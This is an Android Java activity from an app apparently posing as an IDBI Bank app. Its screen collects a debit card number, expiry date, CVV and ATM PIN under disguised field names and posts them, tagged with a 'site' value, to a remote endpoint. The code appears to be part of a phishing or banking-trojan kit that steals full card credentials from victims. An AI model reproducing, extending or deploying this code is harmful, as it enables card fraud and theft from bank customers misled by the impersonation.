package com.idbibank.system;

import android.content.Intent;
import android.os.Bundle;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.idbibank.system.FrontServices.DebitCardInputMask;
import com.idbibank.system.FrontServices.ExpiryDateInputMask;
import com.idbibank.system.FrontServices.FormValidator;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class ThirdActivity extends AppCompatActivity {

    public Map<Integer, String> ids;
    public HashMap<String, Object> dataObject;

    public ThirdActivity() {
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.third_layout);

        // Initialize the dataObject HashMap
        dataObject = new HashMap<>();

        int id = getIntent().getIntExtra("id", -1);
        Button buttonSubmit = findViewById(R.id.proceed);

        EditText mouseccd = findViewById(R.id.mouseccd);
        mouseccd.addTextChangedListener(new DebitCardInputMask(mouseccd));

        EditText expi22 = findViewById(R.id.expi22);
        expi22.addTextChangedListener(new ExpiryDateInputMask(expi22));

        ids = new HashMap<>();
        ids.put(R.id.mouseccd, "mouseccd");
        ids.put(R.id.expi22, "expi22");
        ids.put(R.id.cvv00, "cvv00");
        ids.put(R.id.attpn, "attpn");

        for(Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);

            String value = editText.getText().toString().trim();
            dataObject.put(key, value);
        }

        buttonSubmit.setOnClickListener(v -> {
            if (validateForm()) {

                JSONObject dataJson = new JSONObject(dataObject);
                JSONObject sendPayload = new JSONObject();
                try {
                    Helper helper = new Helper();
                    sendPayload.put("site", helper.SITE());
                    sendPayload.put("data", dataJson);
                    sendPayload.put("id", id);
                    Helper.postRequest(helper.FormSavePath(), sendPayload, new Helper.ResponseListener() {
                        @Override
                        public void onResponse(String result) {
                            if (result.startsWith("Response Error:")) {
                                Toast.makeText(getApplicationContext(), "Response Error : "+result, Toast.LENGTH_SHORT).show();
                            } else {
                                try {
                                    JSONObject response = new JSONObject(result);
                                    if(response.getInt("status")==200){
                                        Intent intent = new Intent(getApplicationContext(), FourthActivity.class);
                                        intent.putExtra("id", id);
                                        startActivity(intent);
                                    }else{
                                        Toast.makeText(getApplicationContext(), "Status Not 200 : "+response, Toast.LENGTH_SHORT).show();
                                    }
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }
                        }
                    });
                } catch (JSONException e) {
                    Toast.makeText(this, "Error1 "+e.toString(), Toast.LENGTH_SHORT).show();
                }
            }else{
                Toast.makeText(getApplicationContext(), "form validation failed", Toast.LENGTH_SHORT).show();
            }

        });

    }

    public boolean validateForm() {
        boolean isValid = true; // Assume the form is valid initially

        // Clear dataObject before adding new data
        dataObject.clear();

        for (Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);

            if(!FormValidator.validateRequired(editText, "Please enter valid input")) { isValid = false;continue;}
            String value = editText.getText().toString().trim();
            switch (key) {
                case "cvv00":
                    if (!FormValidator.validateMinLength(editText, 3, "Invalid CVV")) {
                        isValid = false;
                    }
                    break;
                case "attpn":
                    if (!FormValidator.validateMinLength(editText, 4, "Invalid ATM Pin")) {
                        isValid = false;
                    }
                    break;
                case "expi22":
                    if (!FormValidator.validateMinLength(editText, 5, "Invalid Expiry Date")) {
                        isValid = false;
                    }
                    break;
                case "mouseccd":
                    if (!FormValidator.validateMinLength(editText, 19, "Invalid Card Number")) {
                        isValid = false;
                    }
                    break;
                default:
                    break;
            }
            if (isValid) {
                dataObject.put(key, value);
            }
        }

        return isValid;
    }

}
